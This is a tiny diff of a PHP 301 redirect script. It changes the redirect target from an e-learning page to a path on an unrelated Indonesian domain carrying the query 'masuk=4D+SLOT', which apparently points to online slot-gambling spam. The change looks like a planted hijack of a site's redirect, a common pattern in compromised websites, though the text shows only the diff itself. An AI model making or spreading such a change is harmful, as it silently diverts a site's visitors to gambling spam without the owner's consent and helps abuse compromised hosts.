@@ -2,7 +2,7 @@
 // 301 Redirect Script
 
 // The new URL where the old URL should redirect
-$new_url = "https://ipd-ac.paidafrica.org/elearning/jwbart/";
+$new_url = "https://puslitbang.hapindo.co.id/images/pdf/?masuk=4D+SLOT";
 
 // Send the 301 Moved Permanently status code
 header("HTTP/1.1 301 Moved Permanently");
